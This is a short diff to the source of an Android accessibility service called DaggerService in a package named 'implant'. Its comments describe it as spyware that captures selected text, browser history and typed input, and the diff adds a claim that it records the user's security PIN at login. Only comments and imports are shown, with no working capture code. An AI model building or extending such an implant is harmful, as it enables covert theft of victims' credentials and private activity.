@@ -5,9 +5,7 @@
 * 
 * Although this cannot see passwords from EditText due to Android's restrictions, we can see text
 * the user selects, browser history and non-password text they enter.
-*
-* This service also registers a BroadcastReceiver that listens for screen on and off events to
-* enable ClickJacking.
+* We are also able to record their security PIN when they log in.
 * */
 package com.cooperthecoder.implant.dagger
 
@@ -18,9 +16,9 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import com.cooperthecoder.implant.Config
 import com.cooperthecoder.implant.data.SharedPreferencesQuery
-import com.cooperthecoder.implant.selected
-import com.cooperthecoder.implant.strings
-import com.cooperthecoder.implant.uris
+import com.cooperthecoder.implant.magic.selected
+import com.cooperthecoder.implant.magic.strings
+import com.cooperthecoder.implant.magic.uris
 
 class DaggerService : AccessibilityService() {
 
